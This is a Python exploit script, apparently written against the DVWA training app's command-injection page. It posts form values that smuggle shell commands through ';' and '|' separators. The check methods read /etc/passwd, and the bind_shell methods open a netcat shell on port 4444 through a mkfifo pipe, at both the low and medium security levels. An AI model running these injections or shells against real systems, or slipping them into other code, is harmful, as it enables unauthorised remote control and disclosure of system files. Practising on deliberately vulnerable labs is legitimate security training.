import requests
import json
from urllib.parse import urlencode, quote_plus

class commandExec():
	def __init__(self, url, phpsessid, security):
		self.url = url
		self.phpsessid = phpsessid
		self.security = security

	def sendReq(self, command):
		payload = {'ip':"%s" % (command), 'submit':'submit'}
		url = self.url + "#"
		header = {'Cookie':"PHPSESSID=%s; security=%s" % (self.phpsessid, self.security)}
		req = requests.post(url, headers=header, data=payload)

		return req.content

	def check(self):
		command = "127.0.0.1;cat /etc/passwd"
		return self.sendReq(command)

	def bind_shell_low(self):
		command = "192.168.1.113;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe"
		return self.sendReq(command)

	def check_med(self):
		command = "127.0.0.1 | cat /etc/passwd"
		return self.sendReq(command)

	def bind_shell_med(self):
		command = "192.168.1.113|mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe"
		return self.sendReq(command)

	
